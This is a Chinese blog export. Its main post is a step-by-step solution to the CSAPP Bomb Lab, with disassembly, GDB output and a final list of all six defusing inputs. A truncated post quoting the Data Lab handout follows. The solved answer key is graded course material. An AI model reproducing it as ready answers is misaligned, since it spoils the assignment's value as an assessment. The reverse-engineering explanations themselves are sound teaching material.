{"posts":[{"title":"CSAPP Lab2 Defusing a Binary Bomb","text":"由于实验需要在 x86-64 环境下使用，因此我不得不放弃使用 m1 芯片的 mac 转而使用 win10 在虚拟机上跑了个 centos，这里用 vmware 安装好后，再在 centos 上安装 GDB 即可。 实验前务必参考 讲义。 准备工作 首先，使用 objdump 反编译 bomb，方便后面拆炸弹。 1[root@MiWiFi-R4A-srv bomb]# objdump -d bomb &gt; bomb.txt 然后常用 GDB 命令查询了解即可，GDB 常用命令 - 大 CC - 博客园 (cnblogs.com) 。最后是 x86-64 架构的寄存器含义，可以参考 【原创】X86_64/X86 GNU 汇编、寄存器、内嵌汇编 - 沐多 - 博客园 (cnblogs.com)，建议反复看。另外，如果想从 gdb 运行中途出来打印，又不想没头苍蝇一样打断点，可以直接俄 ctrl+c 出来，然后 continue 继续。 Phase1 123456/* Hmm... Six phases must be more secure than one phase! */ input = read_line(); /* Get input */ phase_1(input); /* Run the phase */ phase_defused(); /* Drat! They figured it out! /* Let me know how they did it. */ printf(&quot;Phase 1 defused. How about the next one?\\n&quot;); 1234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 从 c 代码中不难发现，我们输入一行字符串作为参数，进入 phase1 进行解析。在反汇编得到的文件中找到 phase1 相关部分，挨个解析，再次提示可以反复查阅 【原创】X86_64/X86 GNU 汇编、寄存器、内嵌汇编 - 沐多 - 博客园 (cnblogs.com)。 首先，esi 寄存器保存了 0x402400，按照经验这应该是一个地址，然后调用了函数 strings_not_equal，其功能不难猜出是比较两个字符串是否相等。注意，esi 常用来保存第二个参数，而 edi 常用保存第一个参数，由于在进入 strings_not_equal 之前并没有对其修改，所以其接受的第一个参数默认是父函数也就是 phase_1 接受的第一个（也是唯一一个）参数，即我们所输入的字符串。当我们得到结果后，会经过一段由 test 和 je 组合的检测代码，如果 eax 等于 0 则跳转，越过 explode_bomb。 1234567891011121314151617181920212223242526272829303132333435363738390000000000401338 &lt;strings_not_equal&gt;: 401338: 41 54 push %r12 40133a: 55 push %rbp 40133b: 53 push %rbx 40133c: 48 89 fb mov %rdi,%rbx // 字符串 input 40133f: 48 89 f5 mov %rsi,%rbp // 字符串&quot;???&quot; 401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt; 401347: 41 89 c4 mov %eax,%r12d 40134a: 48 89 ef mov %rbp,%rdi 40134d: e8 c9 ff ff ff callq 40131b &lt;string_length&gt; 401352: ba 01 00 00 00 mov $0x1,%edx 401357: 41 39 c4 cmp %eax,%r12d 40135a: 75 3f jne 40139b &lt;strings_not_equal+0x63&gt; 40135c: 0f b6 03 movzbl (%rbx),%eax 40135f: 84 c0 test %al,%al // 长度为 0 jump 401361: 74 25 je 401388 &lt;strings_not_equal+0x50&gt; 401363: 3a 45 00 cmp 0x0(%rbp),%al 401366: 74 0a je 401372 &lt;strings_not_equal+0x3a&gt; 401368: eb 25 jmp 40138f &lt;strings_not_equal+0x57&gt; 40136a: 3a 45 00 cmp 0x0(%rbp),%al 40136d: 0f 1f 00 nopl (%rax) 401370: 75 24 jne 401396 &lt;strings_not_equal+0x5e&gt; 401372: 48 83 c3 01 add $0x1,%rbx 401376: 48 83 c5 01 add $0x1,%rbp 40137a: 0f b6 03 movzbl (%rbx),%eax 40137d: 84 c0 test %al,%al 40137f: 75 e9 jne 40136a &lt;strings_not_equal+0x32&gt; 401381: ba 00 00 00 00 mov $0x0,%edx 401386: eb 13 jmp 40139b &lt;strings_not_equal+0x63&gt; 401388: ba 00 00 00 00 mov $0x0,%edx 40138d: eb 0c jmp 40139b &lt;strings_not_equal+0x63&gt; 40138f: ba 01 00 00 00 mov $0x1,%edx 401394: eb 05 jmp 40139b &lt;strings_not_equal+0x63&gt; 401396: ba 01 00 00 00 mov $0x1,%edx 40139b: 89 d0 mov %edx,%eax 40139d: 5b pop %rbx 40139e: 5d pop %rbp 40139f: 41 5c pop %r12 4013a1: c3 retq 然后，进入 strings_not_equal 具体分析，string_length 内部就是不断累加长度直到遇到’\\0’。如果字符串 a 和 b 长度不相等就返回 1，长度相等且长度为 0 则返回 0，然后一个字符一个字符比较。 12(gdb) print (char *)0x402400$1 = 0x402400 &quot;Border relations with Canada have never been better.&quot; 现在，我们知道 0x402400 确实是一个字符串起始地址，直接通过 GDB 找到并输入即可。 Phase2 123456/* The second phase is harder. No one will ever figure out * how to defuse this... */ input = read_line(); phase_2(input); phase_defused(); printf(&quot;That's number 2. Keep going!\\n&quot;); 12345678910111213141516171819202122232425260000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; 400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt; 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; 400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt; 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt; 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq 进入其汇编码后，发现有个函数 read_six_numbers，顾名思义读 6 个数字。 123456789101112131415161718000000000040145c &lt;read_six_numbers&gt;: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx // 0-&gt;参数 3 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx // 4-&gt;参数 4 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) // 20-&gt;参数 8 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) // 16-&gt;参数 7 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 // 12-&gt;参数 6 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 // 8-&gt;参数 5 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 &lt;read_six_numbers+0x3d&gt; 401494: e8 a1 ff ff ff callq 40143a &lt;explode_bomb&gt; 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq 实际上其汇编码有点乱，但经过注释，不难发现其实它就是将连续六个数字的位置映射到__isoc99_sscanf@plt 函数的参数 3~8 中，第一个参数 rdi 虽然没写，但我们知道其实就是 input，而第二个参数 esi=0x4025c3 是这个读写函数的格式，我们用 gdb 直接调试可以查到： 12(gdb) print (char*)0x4025c3$3 = 0x4025c3 &quot;%d %d %d %d %d %d&quot; 而且，由于第一个数字（我注释 0→参数 3 那行）映射的 rsi 在父函数 phase2 中其实是 rsp，这下我们终于明白出函数 read_six_numbers 后，首先做的是将第一个数和 1 比较，相等则跳过炸弹。然后是一个循环函数，每次让前一个数的两倍和当前数比较，翻译过就是 a[i + 1] = a[i] * 2，直到 6 个数都遍历完。 最后，我们输入以 1 开始的一个等比数列即可 “1 2 4 8 16 32”，当然由于跳转语句最后用的 jg，我们后面还可以添加数字。另外，函数__isoc99_sscanf@plt 的返回值是其解析匹配成功的数字个数。 Phase3 123456/* I guess this is too easy so far. Some more complex code will * confuse people. */ input = read_line(); phase_3(input); phase_defused(); printf(&quot;Halfway there!\\n&quot;); 123456789101112131415161718192021222324252627282930313233343536370000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx // 参数 4 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx // 参数 3 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; // jump greater 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; // jump above 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax // 0-&gt;0xcf=207 400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 400f83: b8 c3 02 00 00 mov $0x2c3,%eax // 2 400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt; 400f8a: b8 00 01 00 00 mov $0x100,%eax // 3 400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt; 400f91: b8 85 01 00 00 mov $0x185,%eax // 4 400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt; 400f98: b8 ce 00 00 00 mov $0xce,%eax // 5 400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt; 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax // 6 400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt; 400fa6: b8 47 01 00 00 mov $0x147,%eax // 7 400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt; 400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt; 400fb9: b8 37 01 00 00 mov $0x137,%eax // 1 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt; 400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq 在 phase3 起始位置我们看到了和 read_six_numbers 似曾相识的代码，不同的是这次读写格式地址变成了 0x4025cf，我们使用 gdb 解析，得到 12(gdb) print (char*)0x4025cf$4 = 0x4025cf &quot;%d %d&quot; 这次只需要解析两个数字，它们分别放在 0x8 (%rsp) 和 0xc (%rsp)，理所当然的检查了一下解析数字数目，大于一个才能不爆炸。然后是 ja，让第一个数（我们假设为 a）不能大于 7。然后是一个跳转指令，要跳到 0x402470+8xa 这个地址。由于 8bit 为两个字节，所以我们在查看从 0~7 对应的 8 组地址时需要 16 个字节，当然也可以更多就是了，不过我们只需要 16 个字节，注意用 16 进制表示。 12345(gdb) x/16x 0x4024700x402470: 0x00400f7c 0x00000000 0x00400fb9 0x000000000x402480: 0x00400f83 0x00000000 0x00400f8a 0x000000000x402490: 0x00400f91 0x00000000 0x00400f98 0x000000000x4024a0: 0x00400f9f 0x00000000 0x00400fa6 0x00000000 结合这八个地址和机器码不难发现，这就是一个分支选择，写入下标和其对应数字即可，比如 “0 207”。 Phase4 12345/* Oh yeah? Well, how good is your math? Try on this saucy problem! */ input = read_line(); phase_4(input); phase_defused(); printf(&quot;So you got that one. Try this one.\\n&quot;); 1234567891011121314151617181920212223000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; // below &amp; equal 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d &lt;phase_4+0x51&gt; 401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt; 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq phase4 依然是读入两个数字，jbe 就是 jump+below+equal 的组合，其含义不言自明，第一个数要小于等于 14。然后预设了两个参数 14 和 0，和输入的第一个数一起传入 func4。后面紧跟 test 和 jne，要求 func4 结果必须为 0，后面的 cmpl 和 je 要求第二个数必须为 0。一切都很明朗，我们需要输入一个 x 和一个 0。 12345678910111213141516171819202122230000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx // shift+right 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx // (r - l) / 2 + l 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx // r = mid - 1 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi // l = mid + 1 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 由于 func4 有递归，所以我们可以假设输入的是 x，l，r，然后是 (r-l)/2+l。这里有一些细节，shr 逻辑右移时用 0 填充，lea 等效于 mov 的源操作数从地址变成了内容（lea (A) B == mov A B）。以及通过逻辑右移获得 l 和 r 两个变量差值的符号位，这里需要解释一下，由于 ecx 是 32 位形式，所以逻辑右移 31 位得到符号位，这个操作本质是让 r 大于等于 l。然后，我们不难发现，eax 会在从高半区返回后乘以 2 加 1（401003），而从低半区返回后仅仅乘以 2。 综上，我们了解到，首先需要 r 大于等于 l，然后每次都从低半区出来，由于判断语句是 jle，所以等于情况也算作低半区。又因为之前分析过，x 需要小于等于 14，所以只有 0，1，3，7 这四个数字符合，填入即可。 Phase5 12345/* Round and 'round in memory we go, where we stop, the bomb blows! */ input = read_line(); phase_5(input); phase_defused(); printf(&quot;Good work! On to the next...\\n&quot;); 12345678910111213141516171819202122232425262728293031323334353637383940410000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt; 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt; 401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 401089: eb 47 jmp 4010d2 &lt;phase_5+0x70&gt; 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt; 4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 &lt;phase_5+0x77&gt; 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee &lt;phase_5+0x8c&gt; 4010e9: e8 42 fa ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq 通过函数 string_length 函数限制输入字符串长度为 6，然后是一段循环，观察代码 (%rbx,%rax,1)，由于 rbx 是起始位置，所以不断增加 rax 即可达到遍历每个字符的效果。由于 cl 是 rcx 的 8 比特形式（相当于 mod255），后面又和 0xf 相与（相当于去后四位为有效数字），然后将结果同地址 0x4024b0 加起来得到一个新的地址，这个地址显然保存着一个数，将这个数存到 edx。而 dl 是 edx 的 8 比特形式，存到 0x10 (%rsp+rax * 1)。综合来看，就是将我们输入的六个字符按照特殊方式挨个转换成新的字符，最后同 0x40245e 处的字符串比较，匹配就不爆炸。 1234(gdb) print (char*)0x4024b0$6 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;(gdb) print (char*)0x40245e$7 = 0x40245e &quot;flyers&quot; 这里字典很长，但其实我们只需要前 16 个有效字母，也就是 “maduiersnfotvbyl”，而 “flyers” 映射到字母序列为 “f-9 l-15 y-14 e-5 r-6 s-7”，而恰好 a 的 ASCII 码等于 0110 0001，当然 A 对应 0100 0001，所以大小写其实都是等效的，我们通过目标字符串解析的对应下标，倒推我们的源码为 “ionefg”。 另外，汇编中的 401063、40106a 和 4010d9、4010de 呼应，如果二者不匹配会报错。 Phase6 12345/* This phase will never be used, since no one will get past the * earlier ones. But just in case, make this one extra hard. */input = read_line();phase_6(input);phase_defused(); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909100000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d==================================================== 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; 401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt; 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt; 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt;==================================================== 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt; 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt; 401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt; 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt; 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt; 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt;==================================================== 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt; 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt; 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt; 4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt; 4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt; 4011f7: 48 83 c4 50 add $0x50,%rsp 4011fb: 5b pop %rbx 4011fc: 5d pop %rbp 4011fd: 41 5c pop %r12 4011ff: 41 5d pop %r13 401201: 41 5e pop %r14 401203: c3 retq c++ - Print the whole linked list in gdb? - Stack Overflow 在分析代码的过程，我发现这段冗长的代码主要可以分为三个部分，一开始是常规的读入我们输入的六个数字，然后在第一部分将输入 input 根据值转换成新的六个数字（这里我们设其为数组 a），然后在第二部分会根据 a 的值和一个特殊地址 0x5032d0 二者得到得到六个地址（这里我们设其为数组 b，里面每个值都是一个地址），最后在第三部分判断根据 b 的地址得到的值是否满足降序排列，也就是 [b [i] ≥ b [i + 1]]。 下面我们逆向分析，首先通过打印 0x5032d0 处的数据不难发现，其类型为节点，而通过之前的分析，我们知道一共有 6 个节点，观察发现每个节点占四个字节： 1234567(gdb) x/24w 0x6032d00x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x000000000x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x000000000x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x000000000x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x000000000x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x000000000x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 经过解析得到六个节点值为 0x14c、0xa8、0x39c、0x2b3、0x1dd、0x1bb，为了让其降序排列，我们需要将其下标交换，得到 3、4、5、6、1、2，也就是 b [0] 存 node3 的地址，b [1] 存 node4 的地址，以此类推。 再进入第二部分，经过分析，我们发现可以分两种情况：当 a [i]≤1 时，直接让 b [i]=node1；当 a [i]&gt;1 时，会有一个变量 %edx（我们假设它是 j）从 2 到 6 遍历，直到 j 和 a [i] 相等时，让 b [i]=nodej。现在我们应该能推断，实际上 a [i] 的值应是 2~6 以及一个可能为 1 或者 0 的值，而这部分的逻辑就是 b [i]=node_a [i]，而为了得到 b=[node3，node4，node5，node6，node1，node2]，需要让 a=[3, 4, 5, 6, 0 or 1, 2]。 现在再分析第一部分，这部分就相对比较简单了，a [i] = 7 - input [i]，且 a [i] 两两不相等并且限制了输入数字不能大于 6，所以 a [4] 不能等于 0，综上得到 input=“4 3 2 1 6 5” 答案： 1.“Border relations with Canada have never been better.” 2.“1 2 4 8 16 32” 3.“0 207” 4.“0 0” 5.“ionefg” 6.“4 3 2 1 6 5” 参考： 《深入理解计算机系统》Bomb Lab 实验解析 | Yi’s Blog (earthaa.github.io) CMU 15213: Bomb Lab (1) | Wei Bai 白巍 (wordpress.com)","link":"/2022/06/02/CSAPP-LAB-2/"},{"title":"CSAPP Lab1 Manipulating Bits","text":"CSAPP 的 Labs 对照 CMU 的课程 15-213，由于本科有学习过相关内容，所以有的课我就直接跳过了。 代码链接：Manipulating Bits 项目链接：zion4h/csapp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366/* * CS:APP Data Lab * * &lt;Please put your name and userid here&gt; * * bits.c - Source file with your solutions to the Lab. * This is the file you will hand in to your instructor. * * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc * compiler. You can still use printf for debugging without including * &lt;stdio.h&gt;, although you might get a compiler warning. In general, * it's not good practice to ignore compiler warnings, but in this * case it's OK. */#include &lt;printf.h&gt;#if 0/* * Instructions to Students: * * STEP 1: Read the following instructions carefully. */You will provide your solution to the Data Lab byediting the collection of functions in this source file.INTEGER CODING RULES: Replace the &quot;return&quot; statement in each function with one or more lines of C code that implements the function. Your code must conform to the following style: int Funct(arg1, arg2, ...) { /* brief description of how your implementation works */ int var1 = Expr1; ... int varM = ExprM; varJ = ExprJ; ... varN = ExprN; return ExprR; } Each &quot;Expr&quot; is an expression using ONLY the following: 1. Integer constants 0 through 255 (0xFF), inclusive. You are not allowed to use big constants such as 0xffffffff. 2. Function arguments and local variables (no global variables). 3. Unary integer operations ! ~ 4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt; Some of the problems restrict the set of allowed operators even further. Each &quot;Expr&quot; may consist of multiple operators. You are not restricted to one operator per line. You are expressly forbidden to: 1. Use any control constructs such as if, do, while, for, switch, etc. 2. Define or use any macros. 3. Define any additional functions in this file. 4. Call any functions. 5. Use any other operations, such as &amp;&amp;, ||, -, or ?: 6. Use any form of casting. 7. Use any data type other than int. This implies that you cannot use arrays, structs, or unions. You may assume that your machine: 1. Uses 2s complement, 32-bit representations of integers. 2. Performs right shifts arithmetically. 3. Has unpredictable behavior when shifting if the shift amount is less than 0 or greater than 31.EXAMPLES OF ACCEPTABLE CODING STYLE: /* * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31 */ int pow2plus1(int x) { /* exploit ability of shifts to compute powers of 2 */ return (1 &lt;&lt; x) + 1; } /* * pow2plus4 - returns 2^x + 4, where 0 